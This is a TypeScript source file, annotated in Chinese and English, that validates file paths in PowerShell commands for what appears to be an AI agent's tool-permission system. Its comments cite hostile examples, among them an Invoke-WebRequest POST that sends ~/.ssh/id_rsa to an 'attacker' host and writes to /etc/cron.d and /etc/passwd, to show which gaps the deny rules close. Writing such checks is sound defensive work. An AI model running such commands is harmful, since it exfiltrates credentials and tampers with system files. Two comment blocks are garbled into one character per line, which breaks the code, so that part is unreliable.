/**
 * 【一句话定位】从 PowerShell 命令里**抽出文件路径**，再逐个校验这些路径
 * 是否落在允许的工作目录内（或被 deny 规则拒绝）。一句话：管"这条命令碰了哪些文件"。
 *
 * 【在架构中的位置】
 *   powershellPermissions.ts（权限主流程第 6 步"路径约束检查"）
 *        ──调用──> checkPathConstraints(input, parsed, ctx, compoundCommandHasCd)  ←── 本文件主入口
 *   PowerShellTool.tsx ──> powershellPermissions.ts ──> 本文件
 *   本文件 ──> utils/permissions/filesystem.js（真正的 allow/deny 规则匹配、
 *                 工作目录判定、内部可读写路径、安全性检查）
 *             ──> utils/permissions/pathValidation.js（危险删除路径、sandbox 写白名单）
 *             ──> utils/powershell/parser.js（AST、参数判定、空重定向目标判定）
 *             ──> commonParameters.js（通用开关/带值参数）
 *             ──> readOnlyValidation.js（resolveToCanonical 别名解析）
 *
 *   对照 BashTool：src/tools/BashTool/pathValidation.ts 是 Unix 版，
 *   连函数名都一致（checkPathConstraints / isPathAllowed / validatePath）。
 *   原文注释里 "Follows the same patterns as BashTool/pathValidation.ts" 就是这个意思。
 *   本文件里多处写着 "BashTool/pathValidation.ts:630-655" 这类行号，就是两边的对照点。
 *   差异在于 PowerShell 侧要多处理一堆 Windows/PS 特有的路径写法：
 *   provider 限定路径（FileSystem::/etc/passwd）、PSDrive（Z:/x）、
 *   UNC（\\\\server\\share）、反引号转义、模块限定名、冒号绑定值等。
 *
 * 【两阶段流程】
 *   ① **抽取**：CMDLET_PATH_CONFIG 逐 cmdlet 声明"哪些参数是路径参数、
 *      哪些是开关、哪些是带值但非路径"，据此从 AST 参数列表里摘出路径字符串；
 *      凡是看不懂的参数，一律打上 hasUnvalidatablePathArg（后面强制 ask）。
 *   ② **校验**：validatePath() 把每个路径归一化（去引号、~ 展开、反斜杠转正斜杠），
 *      先挡掉一批无法静态判定的形式，再 realpath 解析，最后交给 isPathAllowed()
 *      按 deny → 内部可编辑 → 安全检查 → 工作目录 → allow 规则 的顺序裁决。
 *
 * 【贯穿全文件的裁决优先级：deny > ask > allow】
 *   特别注意"两遍扫描"（1541 行）：必须先把**所有**语句都查完，
 *   否则第 1 条语句返回 ask 就提前返回，第 2 条语句里的 deny 规则就再也查不到了 ——
 *   那等于让用户有机会批准一条包含被禁止路径的命令。
 *
 * 【本文件包含什么】
 *   CMDLET_PATH_CONFIG         ：**主表** —— cmdlet → 路径参数/开关/带值参数配置
 *   CmdletPathConfig           ：上面那张表的条目结构
 *   matchesParam()             ：参数名匹配（支持 PowerShell 的前缀缩写）
 *   hasComplexColonValue()     ：冒号绑定值里是否藏了表达式
 *   expandTilde()              ：~ 展开成 home 目录
 *   isDangerousRemovalRawPath()：是不是危险删除目标（原始形态判断）
 *   dangerousRemovalDeny()     ：构造"删除系统路径被拒"的结果
 *   isPathAllowed()            ：单个已解析路径的裁决（deny/allow 规则、sandbox…）
 *   checkDenyRuleForGuessedPath()：对"猜出来的路径"只查 deny（绝不自动放行）
 *   validatePath()             ：路径归一化 + 各种无法判定形式的拦截 + 解析
 *   getGlobBaseDirectory()     ：取通配符之前的目录部分
 *   extractPathsFromCommand()  ：**抽取**阶段核心
 *   checkPathConstraints()     ：**对外主入口**（整条命令）
 *   checkPathConstraintsForStatement()：单条语句（含重定向、嵌套命令的处理）
 *
 * 【TS 语法速查】
 *   type FileOperationType = 'read' | 'write' | 'create'
 *     字面量联合类型 ≈ Java 的 enum，但不用单独定义枚举类。
 *   type ResolvedPathCheckResult = PathCheckResult & { resolvedPath: string }
 *     `&` 是**交叉类型**（intersection）：把两个类型的字段合并成一个。
 *     ≈ Java 的"继承 + 新增字段"（class B extends A { String resolvedPath; }）。
 *   decisionReason?: import('...').PermissionDecisionReason
 *     **内联 import 类型**：不写顶部 import，直接在类型位置 import。
 *     ≈ Java 里直接用全限定类名（com.xxx.PermissionDecisionReason），
 *     好处是不占顶部 import 列表（这里正是为了避免循环依赖）。
 *   Record<string, CmdletPathConfig>
 *     ≈ Java 的 Map<String, CmdletPathConfig>。
 *   [...config.knownSwitches, ...COMMON_SWITCHES]
 *     数组展开：把两个数组的元素平铺成一个新数组。
 *     ≈ Java: Stream.concat(a.stream(), b.stream()).toList()
 *   config.positionalSkip ?? 0
 *     ?? 空值合并：只在 null/undefined 时取默认值（与 || 的区别：0 不会被替换，
 *     这里恰恰需要保留 0，所以必须用 ?? 而不是 ||）。
 *   firstAsk ??= { ... }
 *     **空值赋值运算符**：只在左侧为 null/undefined 时才赋值。
 *     ≈ Java: if (firstAsk == null) firstAsk = ...;
 *     本文件大量用它表达"保留第一个 ask，但不要覆盖已有的" —— 配合
 *     "deny 立即 return"形成 deny > ask 的优先级。
 *   readonly string[]
 *     只读数组：编译期禁止 push/splice 等修改操作（运行时仍是普通数组）。
 */
/**
 * PowerShell-specific path validation for command arguments.
 *
 * Extracts file paths from PowerShell commands using the AST parser
 * and validates they stay within allowed project directories.
 * Follows the same patterns as BashTool/pathValidation.ts.
 */

import { homedir } from 'os'
import { isAbsolute, resolve } from 'path'
import type { ToolPermissionContext } from '../../Tool.js'
import type { PermissionRule } from '../../types/permissions.js'
import { getCwd } from '../../utils/cwd.js'
import {
  getFsImplementation,
  safeResolvePath,
} from '../../utils/fsOperations.js'
import { containsPathTraversal, getDirectoryForPath } from '../../utils/path.js'
import {
  allWorkingDirectories,
  checkEditableInternalPath,
  checkPathSafetyForAutoEdit,
  checkReadableInternalPath,
  matchingRuleForInput,
  pathInAllowedWorkingPath,
} from '../../utils/permissions/filesystem.js'
import type { PermissionResult } from '../../utils/permissions/PermissionResult.js'
import { createReadRuleSuggestion } from '../../utils/permissions/PermissionUpdate.js'
import type { PermissionUpdate } from '../../utils/permissions/PermissionUpdateSchema.js'
import {
  isDangerousRemovalPath,
  isPathInSandboxWriteAllowlist,
} from '../../utils/permissions/pathValidation.js'
import { getPlatform } from '../../utils/platform.js'
import type {
  ParsedCommandElement,
  ParsedPowerShellCommand,
} from '../../utils/powershell/parser.js'
import {
  isNullRedirectionTarget,
  isPowerShellParameter,
} from '../../utils/powershell/parser.js'
import { COMMON_SWITCHES, COMMON_VALUE_PARAMS } from './commonParameters.js'
import { resolveToCanonical } from './readOnlyValidation.js'

// 提示文案里最多列举几个目录（列太多会刷屏）。
const MAX_DIRS_TO_LIST = 5
// PowerShell 的通配符只有 * ? [ ] —— 花括号是**字面字符**（不像 bash 会做花括号展开）。
// 这个区别很要紧：把 {} 也算进去的话，./{x}/passwd 会被当成 glob 走
// 「取 glob 之前的基目录」那条路，而不是走完整的符号链接解析 —— 那就漏了。
// PowerShell wildcards are only * ? [ ] — braces are LITERAL characters
// (no brace expansion). Including {} mis-routed paths like `./{x}/passwd`
// through glob-base truncation instead of full-path symlink resolution.
const GLOB_PATTERN_REGEX = /[*?[\]]/

// 三种操作类型。read 之外的都按「编辑」权限去匹配规则。
type FileOperationType = 'read' | 'write' | 'create'

// 注意 decisionReason 用的是**内联 import 类型**：不占顶部 import，
// 这样就不会因为多引一个名字而引入循环依赖。
type PathCheckResult = {
  allowed: boolean
  decisionReason?: import('../../utils/permissions/PermissionResult.js').PermissionDecisionReason
}

// `&` 交叉类型：在 PathCheckResult 基础上再加一个 resolvedPath 字段。
// ≈ Java 的 class Resolved extends PathCheck { String resolvedPath; }
type ResolvedPathCheckResult = PathCheckResult & {
  resolvedPath: string
}

/**
 * Per-cmdlet parameter configuration.
 *
 * Each entry declares:
 *   - operationType: whether this cmdlet reads or writes to the filesystem
 *   - pathParams: parameters that accept file paths (validated against allowed directories)
 *   - knownSwitches: switch parameters (take NO value) — next arg is NOT consumed
 *   - knownValueParams: value-taking parameters that are NOT paths — next arg IS consumed
 *     but NOT validated as a path (e.g., -Encoding UTF8, -Filter *.txt)
 *
 * SECURITY MODEL: Any -Param NOT in one of these three sets forces
 * hasUnvalidatablePathArg → ask. This ends the KNOWN_SWITCH_PARAMS whack-a-mole
 * where every missing switch caused the unknown-param heuristic to swallow the
 * next arg (potentially the positional path). Now, Tier 2 cmdlets only auto-allow
 * with invocations we fully understand.
 *
 * Sources:
 *   - (Get-Command <cmdlet>).Parameters on Windows PowerShell 5.1
 *   - PS 6+ additions from official docs (e.g., -AsByteStream, -NoEmphasis)
 *
 * NOTE: Common parameters (-Verbose, -ErrorAction, etc.) are NOT listed here;
 * they are merged in from COMMON_SWITCHES / COMMON_VALUE_PARAMS at lookup time.
 *
 * Parameter names are lowercase with leading dash to match runtime comparison.
 */
/**
 * 【中文】逐 cmdlet 的**参数元数据表**的条目结构。四个字段决定「这条命令怎么写我们才看得懂」：
 *   pathParams       ：哪些参数是文件路径（要拿去做路径校验）
 *   knownSwitches    ：哪些是开关型参数（**不吃**后面的 token）
 *   knownValueParams ：哪些是带值但**不是路径**的参数（吃掉后面 token，但不校验）
 *                      例：-Encoding UTF8、-Filter *.txt
 *   leafOnlyPathParams / positionalSkip / optionalWrite：三个特殊场景的开关（见各自注释）
 *
 * 【安全模型】任何一个参数只要**不在这三张表里**，就把整条命令标记为
 * hasUnvalidatablePathArg → 强制 ask。
 * 这终结了早年「KNOWN_SWITCH_PARAMS 打地鼠」的局面：
 * 以前漏记一个开关，未知参数启发式就会把后面的 token 当成它的值吞掉，
 * 而那可能正是真正的路径参数（于是路径没被校验就放行了）。
 */
type CmdletPathConfig = {
  operationType: FileOperationType
  /** Parameter names that accept file paths (validated against allowed directories) */
  pathParams: string[]
  /** Switch parameters that take no value (next arg is NOT consumed) */
  knownSwitches: string[]
  /** Value-taking parameters that are not paths (next arg IS consumed, not path-validated) */
  knownValueParams: string[]
  /**
   * Parameter names that accept a leaf filename resolved by PowerShell
   * relative to ANOTHER parameter (not cwd). Safe to extract only when the
   * value is a simple leaf (no `/`, `\`, `.`, `..`). Non-leaf values are
   * flagged as unvalidatable because validatePath resolves against cwd, not
   * the actual base — joining against -Path would need cross-parameter
   * tracking.
   */
// 这类参数的值是 PowerShell 相对**另一个参数**解析的叶子名（不是相对 cwd），
// 例：New-Item -Path /allowed -Name foo.txt 里的 foo.txt。
// 只有当值是「纯叶子名」（不含 / \ . ..）时才敢抽出来，否则标记不可判定。
  leafOnlyPathParams?: string[]
  /**
   * Number of leading positional arguments to skip (NOT extracted as paths).
   * Used for cmdlets where positional-0 is a non-path value — e.g.,
   * Invoke-WebRequest's positional -Uri is a URL, not a local filesystem path.
   * Without this, `iwr http://example.com` extracts `http://example.com` as
   * a path, and validatePath's provider-path regex (^[a-z]{2,}:) misfires on
   * the URL scheme with a confusing "non-filesystem provider" message.
   */
/
/
 
跳
过
开
头
若
干
个
位
置
参
数
（
它
们
不
是
路
径
）
。
典
型
：
i
w
r
 
的
 
0
 
号
位
置
参
数
是
 
U
R
L
。
  positionalSkip?: number
  /**
   * When true, this cmdlet only writes to disk when a pathParam is present.
   * Without a path (e.g., `Invoke-WebRequest https://example.com` with no
   * -OutFile), it's effectively a read operation — output goes to the pipeline,
   * not the filesystem. Skips the "write with no target path" forced-ask.
   * Cmdlets like Set-Content that ALWAYS write should NOT set this.
   */
/
/
 
有
的
 
c
m
d
l
e
t
 
只
有
在
给
出
路
径
参
数
时
才
真
的
写
盘
（
如
 
i
w
r
 
不
带
 
-
O
u
t
F
i
l
e
 
时
只
输
出
到
管
道
）
，
  optionalWrite?: boolean
}

/**
 * 【中文】**核心配置表**：cmdlet 规范名 → 参数元数据。
 * 这张表是本文件「抽取阶段」的全部知识来源，也是最容易漏的地方 ——
 * 漏一个 cmdlet，它的路径就不会被校验（虽然不会误放行，但会把 deny 降级成 ask）。
 */
const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = {
  // ─── Write/create operations ──────────────────────────────────────────────
// 表名一律小写；参数名一律「小写 + 前导减号」，与运行时的比较方式保持一致。
  'set-content': {
    operationType: 'write',
// -PSPath / -LP 是 -LiteralPath 的运行时别名（所有 provider cmdlet 都有）。
// 漏了它们的话，-PSPath:/etc/x 这种冒号写法会掉进「未知参数」分支，
// 值被困在单个 token 里 → paths 为空 → deny 规则压根不会被查（deny 降级成 ask）。
    // -PSPath and -LP are runtime aliases for -LiteralPath on all provider
    // cmdlets. Without them, colon syntax (-PSPath:/etc/x) falls to the
    // unknown-param branch → path trapped → paths=[] → deny never consulted.
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
      '-nonewline',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-value',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-encoding',
      '-stream',
    ],
  },
  'add-content': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
      '-nonewline',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-value',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-encoding',
      '-stream',
    ],
  },
  'remove-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-recurse',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
  'clear-content': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
// Out-File / Tee-Object / Export-Csv / Export-Clixml 曾经**漏登记**：
// 结果 `Set-Content /etc/x` 被 deny 规则硬拦，而 `Out-File /etc/x` 只是 ask ——
// 同样是写 /etc，防护强度却不一样。补上这四个后口径才一致。
  // Out-File/Tee-Object/Export-Csv/Export-Clixml were absent, so path-level
  // deny rules (Edit(/etc/**)) hard-blocked `Set-Content /etc/x` but only
  // *asked* for `Out-File /etc/x`. All four are write cmdlets that accept
  // file paths positionally.
// Out-File 用的是 -FilePath（0 号位置参数），而 -Path 是官方文档里的**别名**，
// 两个都得收进 pathParams，否则 -Path:./x 这种冒号写法会掉进未知参数分支。
  'out-file': {
    operationType: 'write',
    // Out-File uses -FilePath (position 0). -Path is PowerShell's documented
    // ALIAS for -FilePath — must be in pathParams or `Out-File -Path:./x`
    // (colon syntax, one token) falls to unknown-param → value trapped →
    // paths=[] → Edit deny never consulted → ask (fail-safe but deny downgrade).
    pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-nonewline',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: ['-inputobject', '-encoding', '-width'],
  },
  'tee-object': {
    operationType: 'write',
    // Tee-Object uses -FilePath (position 0, alias: -Path). -Variable NOT a path.
    pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-append'],
    knownValueParams: ['-inputobject', '-variable', '-encoding'],
  },
  'export-csv': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-notypeinformation',
      '-includetypeinformation',
      '-useculture',
      '-noheader',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: [
      '-inputobject',
      '-delimiter',
      '-encoding',
      '-quotefields',
      '-usequotes',
    ],
  },
  'export-clixml': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-noclobber', '-whatif', '-confirm'],
    knownValueParams: ['-inputobject', '-depth', '-encoding'],
  },
// New-Item / Copy-Item / Move-Item 曾经漏登记，于是 `mkdir /etc/cron.d/evil`
// （mkdir 经别名解析成 new-item）因为查不到配置而直接返回空路径列表，
// deny 规则完全没被咨询 —— 补上它们才闭合了「别名 → 配置」的覆盖审计。
  // New-Item/Copy-Item/Move-Item were missing: `mkdir /etc/cron.d/evil` →
  // resolveToCanonical('mkdir') = 'new-item' via COMMON_ALIASES → not in
  // config → early return {paths:[], 'read'} → Edit deny never consulted.
  //
  // Copy-Item/Move-Item have DUAL path params (-Path source, -Destination
  // dest). operationType:'write' is imperfect — source is semantically a read
  // — but it means BOTH paths get Edit-deny validation, which is strictly
  // safer than extracting neither. A per-param operationType would be ideal
  // but that's a bigger schema change; blunt 'write' closes the gap now.
// Copy-Item / Move-Item 有**双路径参数**（-Path 源、-Destination 目标）。
// 把它们整体标成 write 并不精确（源语义上是读），但好处是两个路径都会走
// Edit-deny 校验 —— 比「哪个都不抽」安全得多。这是有意选择的粗粒度方案。
  'new-item': {
    operationType: 'write',
    // -Path is position 0. -Name (position 1) is resolved by PowerShell
    // RELATIVE TO -Path (per MS docs: "you can specify the path of the new
    // item in Name"), including `..` traversal. We resolve against CWD
    // (validatePath L930), not -Path — so `New-Item -Path /allowed
    // -Name ../secret/evil` creates /allowed/../secret/evil = /secret/evil,
    // but we resolve cwd/../secret/evil which lands ELSEWHERE and can miss
    // the deny rule. This is a deny→ask downgrade, not fail-safe.
    //
    // -name is in leafOnlyPathParams: simple leaf filenames (`foo.txt`) are
    // extracted (resolves to cwd/foo.txt — slightly wrong, but -Path
    // extraction covers the directory, and a leaf can't traverse);
    // any value with `/`, `\`, `.`, `..` flags hasUnvalidatablePathArg →
    // ask. Joining -Name against -Path would be correct but needs
    // cross-parameter tracking — out of scope here.
// New-Item 的 -Name 是 leafOnly：PowerShell 把它**相对 -Path** 解析，
// 而我们的 validatePath 是相对 cwd 解析的 —— 两者不一致。
// 所以只允许「纯叶子名」（叶子跑不出目录），带分隔符或 .. 的一律标记不可判定。
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    leafOnlyPathParams: ['-name'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: ['-itemtype', '-value', '-credential', '-type'],
  },
  'copy-item': {
    operationType: 'write',
    // -Path (position 0) is source, -Destination (position 1) is dest.
    // Both extracted; both validated as write.
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
    knownSwitches: [
      '-container',
      '-force',
      '-passthru',
      '-recurse',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-fromsession',
      '-tosession',
    ],
  },
  'move-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: ['-filter', '-include', '-exclude', '-credential'],
  },
  // rename-item/set-item: same class — ren/rni/si in COMMON_ALIASES, neither
  // was in config. `ren /etc/passwd passwd.bak` → resolves to rename-item
  // → not in config → {paths:[], 'read'} → Edit deny bypassed. This closes
  // the COMMON_ALIASES→CMDLET_PATH_CONFIG coverage audit: every
  // write-cmdlet alias now resolves to a config entry.
  'rename-item': {
    operationType: 'write',
// Rename-Item 的 -NewName 与 New-Item 的 -Name **不同**：
// 文档明确说它不能带新驱动器或不同路径，而且 PowerShell 本身就拒绝其中的 ..，
// 所以放进 knownValueParams（当作普通值）就够了，不需要 leafOnly 特判。
    // -Path position 0, -NewName position 1. -NewName is leaf-only (docs:
    // "You cannot specify a new drive or a different path") and Rename-Item
    // explicitly rejects `..` in it — so knownValueParams is correct here,
    // unlike New-Item -Name which accepts traversal.
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-newname',
      '-credential',
      '-filter',
      '-include',
      '-exclude',
    ],
  },
  'set-item': {
    operationType: 'write',
// Set-Item 对文件系统 provider 其实会抛 NotSupportedException，
// 真正的写入面在注册表/环境变量/函数/别名这些 provider 上。
// 这里仍把它标成 write 属于**纵深防御**（provider 限定路径另有专门检查）。
    // FileSystem provider throws NotSupportedException for Set-Item content,
    // so the practical write surface is registry/env/function/alias providers.
    // Provider-qualified paths (HKLM:\\, Env:\\) are independently caught at
    // step 3.5 in powershellPermissions.ts, but classifying set-item as write
    // here is defense-in-depth — powershellSecurity.ts:379 already lists it
    // in ENV_WRITE_CMDLETS; this makes pathValidation consistent.
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-value',
      '-credential',
      '-filter',
      '-include',
      '-exclude',
    ],
  },
// ================= 读操作 =================（下面这批 operationType 都是 read）
  // ─── Read operations ──────────────────────────────────────────────────────
  'get-content': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-usetransaction',
      '-wait',
      '-raw',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-readcount',
      '-totalcount',
      '-tail',
      '-first', // alias for -TotalCount
      '-head', // alias for -TotalCount
      '-last', // alias for -Tail
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-delimiter',
      '-encoding',
      '-stream',
    ],
  },
  'get-childitem': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-recurse',
      '-force',
      '-name',
      '-usetransaction',
      '-followsymlink',
      '-directory',
      '-file',
      '-hidden',
      '-readonly',
      '-system',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-depth',
      '-attributes',
      '-credential',
    ],
  },
  'get-item': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
  'get-itemproperty': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'get-itempropertyvalue': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'get-filehash': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [],
    knownValueParams: ['-algorithm', '-inputstream'],
  },
  'get-acl': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-audit', '-allcentralaccesspolicies', '-usetransaction'],
    knownValueParams: ['-inputobject', '-filter', '-include', '-exclude'],
  },
  'format-hex': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-raw'],
    knownValueParams: [
      '-inputobject',
      '-encoding',
      '-count', // PS 6+
      '-offset', // PS 6+
    ],
  },
  'test-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-isvalid', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-pathtype',
      '-credential',
      '-olderthan',
      '-newerthan',
    ],
  },
  'resolve-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-relative', '-usetransaction', '-force'],
    knownValueParams: ['-credential', '-relativebasepath'],
  },
// convert-path 整体就是「把路径解析成文件系统路径」，必须做路径校验。
  'convert-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [],
  },
  'select-string': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-simplematch',
      '-casesensitive',
      '-quiet',
      '-list',
      '-notmatch',
      '-allmatches',
      '-noemphasis', // PS 7+
      '-raw', // PS 7+
    ],
    knownValueParams: [
      '-inputobject',
      '-pattern',
      '-include',
      '-exclude',
      '-encoding',
      '-context',
      '-culture', // PS 7+
    ],
  },
  'set-location': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
  'push-location': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
// Pop-Location 其实没有 -Path（它从栈里弹），但保留条目让它能平滑走完流程。
  'pop-location': {
    operationType: 'read',
    // Pop-Location has no -Path/-LiteralPath (it pops from the stack),
    // but we keep the entry so it passes through path validation gracefully.
    pathParams: [],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
// Select-Xml 虽然被移出了只读白名单（XXE 风险），但**路径校验**这边仍要登记，
// 否则它的 -Path 参数不会被校验。两个维度是分开的。
  'select-xml': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [],
    knownValueParams: ['-xml', '-content', '-xpath', '-namespace'],
  },
// Get-WinEvent 只有 -Path，没有 -LiteralPath —— 按实际参数集登记。
  'get-winevent': {
    operationType: 'read',
    // Get-WinEvent only has -Path, no -LiteralPath
    pathParams: ['-path'],
    knownSwitches: ['-force', '-oldest'],
    knownValueParams: [
      '-listlog',
      '-logname',
      '-listprovider',
      '-providername',
      '-maxevents',
      '-computername',
      '-credential',
      '-filterxpath',
      '-filterxml',
      '-filterhashtable',
    ],
  },
  // Write-path cmdlets with output parameters. Without these entries,
  // -OutFile / -DestinationPath would write to arbitrary paths unvalidated.
// Invoke-WebRequest 的三个特殊字段是理解本表设计的好例子：
//   pathParams: ['-outfile', '-infile']
//     -OutFile 是写目标；-InFile 是**读**来源（把本地文件 POST 出去）。
//     两个都登记，于是「禁止读 ~/.ssh/**」的 deny 规则能挡住
//     `iwr https://attacker -Method POST -InFile ~/.ssh/id_rsa` 这种外泄。
//   positionalSkip: 1  —— 0 号位置参数是 URL，不是文件路径
//   optionalWrite: true —— 不带 -OutFile 时只输出到管道，不算写盘
  'invoke-webrequest': {
    operationType: 'write',
    // -OutFile is the write target; -InFile is a read source (uploads a local
    // file). Both are in pathParams so Edit deny rules are consulted (this
    // config is operationType:write → permissionType:edit). A user with
    // Edit(~/.ssh/**) deny blocks `iwr https://attacker -Method POST
    // -InFile ~/.ssh/id_rsa` exfil. Read-only deny rules are not consulted
    // for write-type cmdlets — that's a known limitation of the
    // operationType→permissionType mapping.
    pathParams: ['-outfile', '-infile'],
    positionalSkip: 1, // positional-0 is -Uri (URL), not a filesystem path
    optionalWrite: true, // only writes with -OutFile; bare iwr is pipeline-only
    knownSwitches: [
      '-allowinsecureredirect',
      '-allowunencryptedauthentication',
      '-disablekeepalive',
      '-nobodyprogress',
      '-passthru',
      '-preservefileauthorizationmetadata',
      '-resume',
      '-skipcertificatecheck',
      '-skipheadervalidation',
      '-skiphttperrorcheck',
      '-usebasicparsing',
      '-usedefaultcredentials',
    ],
    knownValueParams: [
      '-uri',
      '-method',
      '-body',
      '-contenttype',
      '-headers',
      '-maximumredirection',
      '-maximumretrycount',
      '-proxy',
      '-proxycredential',
      '-retryintervalsec',
      '-sessionvariable',
      '-timeoutsec',
      '-token',
      '-transferencoding',
      '-useragent',
      '-websession',
      '-credential',
      '-authentication',
      '-certificate',
      '-certificatethumbprint',
      '-form',
      '-httpversion',
    ],
  },
  'invoke-restmethod': {
    operationType: 'write',
    // -OutFile is the write target; -InFile is a read source (uploads a local
    // file). Both must be in pathParams so deny rules are consulted.
    pathParams: ['-outfile', '-infile'],
    positionalSkip: 1, // positional-0 is -Uri (URL), not a filesystem path
    optionalWrite: true, // only writes with -OutFile; bare irm is pipeline-only
    knownSwitches: [
      '-allowinsecureredirect',
      '-allowunencryptedauthentication',
      '-disablekeepalive',
      '-followrellink',
      '-nobodyprogress',
      '-passthru',
      '-preservefileauthorizationmetadata',
      '-resume',
      '-skipcertificatecheck',
      '-skipheadervalidation',
      '-skiphttperrorcheck',
      '-usebasicparsing',
      '-usedefaultcredentials',
    ],
    knownValueParams: [
      '-uri',
      '-method',
      '-body',
      '-contenttype',
      '-headers',
      '-maximumfollowrellink',
      '-maximumredirection',
      '-maximumretrycount',
      '-proxy',
      '-proxycredential',
      '-responseheaderstvariable',
      '-retryintervalsec',
      '-sessionvariable',
      '-statuscodevariable',
      '-timeoutsec',
      '-token',
      '-transferencoding',
      '-useragent',
      '-websession',
      '-credential',
      '-authentication',
      '-certificate',
      '-certificatethumbprint',
      '-form',
      '-httpversion',
    ],
  },
// Expand-Archive / Compress-Archive：-DestinationPath 也是路径，必须登记，
// 否则解压到任意目录不会被拦。
  'expand-archive': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destinationpath'],
    knownSwitches: ['-force', '-passthru', '-whatif', '-confirm'],
    knownValueParams: [],
  },
  'compress-archive': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destinationpath'],
    knownSwitches: ['-force', '-update', '-passthru', '-whatif', '-confirm'],
    knownValueParams: ['-compressionlevel'],
  },
// *-ItemProperty 系列主要用于注册表 provider（在键下读写值）。
// provider 限定路径（HKLM:\ 之类）在 powershellPermissions.ts 第 3.5 步另有拦截，
// 这里登记是纵深防御 + 让 Edit-deny 规则能被咨询。
  // *-ItemProperty cmdlets: primary use is the Registry provider (set/new/
  // remove a registry VALUE under a key). Provider-qualified paths (HKLM:\,
  // HKCU:\) are independently caught at step 3.5 in powershellPermissions.ts.
